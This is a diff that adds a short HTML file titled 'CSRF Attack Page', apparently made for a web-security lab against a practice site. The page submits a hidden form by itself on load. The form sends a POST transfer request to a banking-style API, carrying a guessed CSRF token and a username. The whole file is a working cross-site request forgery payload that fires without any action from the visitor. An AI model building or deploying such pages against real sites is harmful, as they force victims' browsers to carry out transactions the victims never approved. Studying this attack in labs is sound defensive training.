@@ -1,0 +1,16 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>CSRF Attack Page</title>
+</head>
+<body onload="document.forms[0].submit()">
+
+  <form action="https://phish-me.quoccacorp.com/api/transfer" method="POST">
+    <input type="hidden" name="csrf_token" value="NzY2NA%3D%3D">
+    <input type="hidden" name="username" value="z5419571">
+    <input type="hidden" name="amount" value="1">
+  </form>
+
+</body>
+</html>
